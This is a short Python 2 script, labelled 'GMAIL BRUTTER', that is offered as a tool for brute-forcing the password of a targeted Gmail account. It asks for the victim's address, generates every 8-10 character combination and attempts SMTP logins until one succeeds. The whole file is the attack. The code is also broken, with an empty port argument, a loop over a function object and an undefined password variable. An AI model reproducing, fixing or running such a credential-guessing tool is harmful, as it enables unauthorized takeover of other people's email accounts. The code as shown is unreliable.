print"""


            GMAIL BRUTTER BY m3hr44n

            https://github.com/m3hr44n

                    VERSION 1.0

"""

import itertools 
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", )
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter Target's Gmail Address ==> : ")
def print_perms(chars, minlen, maxlen): 
    for n in range(minlen, maxlen+1): 
        for perm in itertools.product(chars, repeat=n): 
            print(''.join(perm)) 

print_perms("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*+", 8, 10,)

for symbols in print_perms:
    try:
        smtpserver.login(user, password)

        print "[+] Password Cracked: %s" % symbols
        break;
    except smtplib.SMTPAuthenticationError:
        print "[!] Password Inccorect: %s" % symbols
